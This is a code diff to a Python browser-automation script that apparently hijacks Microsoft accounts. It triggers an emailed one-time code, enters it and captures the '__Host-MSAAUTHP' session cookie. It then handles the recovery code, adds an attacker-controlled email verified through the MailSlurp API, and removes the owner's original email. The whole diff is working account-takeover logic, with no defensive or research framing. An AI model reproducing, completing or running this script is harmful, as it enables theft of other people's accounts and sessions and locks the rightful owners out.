@@ -56,11 +56,16 @@ async def automate_password_reset(email):  # Just Sends Code
                     await page.click("#otcLoginLink")
                     await asyncio.sleep(4)
                     await browser.close()
-            else:
+            if page.is_visible("#idA_PWD_SwitchToCredPicker"):
                 await page.click("#idA_PWD_SwitchToCredPicker")
                 await browser.close()
                 await asyncio.sleep(2)
                 send_code(credential_data,email)
+            if page.is_visible("#idTxtBx_OTC_Password"):
+                print("Code Auto Sent")
+            else:
+                print("No Email 2FA Turned On")
+                return False
         except Exception as e:
             print(f"Error: {e}")
 
@@ -116,56 +121,54 @@ async def automate_auto_change(email, code, newemail, newpass):
                     await page.click("#proofConfirmationToggle")
                 except Exception:
                     pass
-                await page.fill('[data-testid="idTxtBx_OTC_Password"]', code)
-                await page.press('[data-testid="idTxtBx_OTC_Password"]', "Enter")
-                await page.check("#checkboxField")
-                await page.click("#acceptButton")
-                #Get Cookies
-                context = page.context
-                cookies = await context.cookies()
-                for cookie in cookies:
-                    if cookie['name'] == '__Host-MSAAUTHP':
-                        print(f"Cookie __Host-MSAAUTHP: {cookie['value']}")
-                        config.LastCookie= {cookie['value']}
+            await page.fill('[data-testid="idTxtBx_OTC_Password"]', code)
+            await page.press('[data-testid="idTxtBx_OTC_Password"]', "Enter")
+            await page.check("#checkboxField")
+            await page.click("#acceptButton")
+            #Get Cookies
+            context = page.context
+            cookies = await context.cookies()
+            for cookie in cookies:
+                if cookie['name'] == '__Host-MSAAUTHP':
+                    print(f"Cookie __Host-MSAAUTHP: {cookie['value']}")
+                    config.LastCookie= {cookie['value']}
 
-                print("Cookie __Host-MSAAUTHP not found.")
+            print("Cookie __Host-MSAAUTHP not found.")
 
-                #May Need To Add Some Try Catch Statements As There Are Some Odd Pop Ups I Cant Remember About
+            #May Need To Add Some Try Catch Statements As There Are Some Odd Pop Ups I Cant Remember About
 
-                try: #Checks For Phone Pop Up
-                    popup_locator = page.locator(".ms-Stack.dialogBody.css-191").nth(0)
-                    await popup_locator.wait_for(timeout=20000)
-                    close_button = page.locator("button#landing-page-dialog\\.close")
-                    await close_button.click()
-                except Exception:
-                    pass
-                await page.locator("#home\\.drawers\\.security").click()
-                await page.get_by_text("Additional security options").nth(1).click()
-                await asyncio.sleep(4)
-                await handle_recovery_code(page)
+            try: #Checks For Phone Pop Up
+                popup_locator = page.locator(".ms-Stack.dialogBody.css-191").nth(0)
+                await popup_locator.wait_for(timeout=20000)
+                close_button = page.locator("button#landing-page-dialog\\.close")
+                await close_button.click()
+            except Exception:
+                pass
+            await page.locator("#home\\.drawers\\.security").click()
+            await page.get_by_text("Additional security options").nth(1).click()
+            await asyncio.sleep(4)
+            await handle_recovery_code(page)
 
 
 
-                # Add a new email for account
-                await page.get_by_role("button", name="Add a new way to sign in or").click()
-                await page.get_by_role("button", name="Show more options").click()
-                await page.get_by_role("button", name="Email a code Get an email and").click()
-                await page.get_by_placeholder("someone@example.com").fill(newemail)
-                await page.click('input.btn.btn-block.btn-primary#iNext')
+            # Add a new email for account
+            await page.get_by_role("button", name="Add a new way to sign in or").click()
+            await page.get_by_role("button", name="Show more options").click()
+            await page.get_by_role("button", name="Email a code Get an email and").click()
+            await page.get_by_placeholder("someone@example.com").fill(newemail)
+            await page.click('input.btn.btn-block.btn-primary#iNext')
 
                 # Retrieve and fill security code
-                security_code = get_security_code_by_email(config.MAILSLURP_API_KEY, newemail)
-                await page.fill("#iOttText", security_code)
-                await page.click("#iNext")
+            security_code = get_security_code_by_email(config.MAILSLURP_API_KEY, newemail)
+            await page.fill("#iOttText", security_code)
+            await page.click("#iNext")
 
-                # Demote old email
-                await page.wait_for_selector('div#Email0 .pullout-link-text:has-text("Email a code")', timeout=10000)
-                await page.click('div#Email0 .pullout-link-text:has-text("Email a code")')
-                await page.click('button#Remove')
-                await page.click('button#iBtn_action')
+            # Demote old email
+            await page.wait_for_selector('div#Email0 .pullout-link-text:has-text("Email a code")', timeout=10000)
+            await page.click('div#Email0 .pullout-link-text:has-text("Email a code")')
+            await page.click('button#Remove')
+            await page.click('button#iBtn_action')
 
-            else:
-                print("Unexpected flow encountered. Adjust the logic accordingly.")
         except Exception as e:
             print(f"An error occurred: {e}")
         finally:
